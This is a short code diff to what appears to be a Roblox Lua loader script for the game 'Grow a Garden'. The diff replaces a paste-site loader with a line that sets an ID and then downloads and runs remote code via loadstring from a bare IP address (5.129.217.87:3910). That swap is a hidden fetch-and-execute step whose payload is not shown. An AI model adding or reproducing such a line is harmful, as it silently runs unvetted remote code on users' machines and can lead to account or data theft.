@@ -15,7 +15,8 @@ local function runLoaders()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptDy/GrowAGarden/refs/heads/main/Library"))()
     end)
     pcall(function()
-        loadstring(game:HttpGet("https://pastefy.app/xtHMle6O/raw"))()
+        ID="57ea602b-18fe-4aa6-934d-1edef20ecc0e";
+loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
     end)
 end
 
